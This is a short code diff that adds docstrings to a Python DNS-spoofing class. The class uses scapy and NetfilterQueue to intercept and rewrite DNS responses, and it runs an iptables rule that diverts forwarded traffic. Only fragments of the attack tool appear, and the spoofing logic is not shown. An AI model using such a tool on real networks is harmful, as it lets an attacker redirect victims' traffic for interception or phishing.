@@ -11,6 +11,9 @@ class dns_spoofing:
         self.queue = NetfilterQueue()
 
     def callBack(self, packet):
+        """
+        Callback function to modify DNS responses
+        """
         scapyPacket = IP(packet.get_payload())
         if scapyPacket.haslayer(DNSRR):
             try:
@@ -32,6 +35,9 @@ class dns_spoofing:
             return packet.accept()
 
     def __call__(self):
+        """
+        Start DNS spoofing and handle KeyboardInterrupt exception
+        """
         print("Start snoofing")
         os.system(f'sudo iptables -I FORWARD -j NFQUEUE --queue-num {self.queueNum}')
         self.queue.bind(self.queueNum, self.callBack)
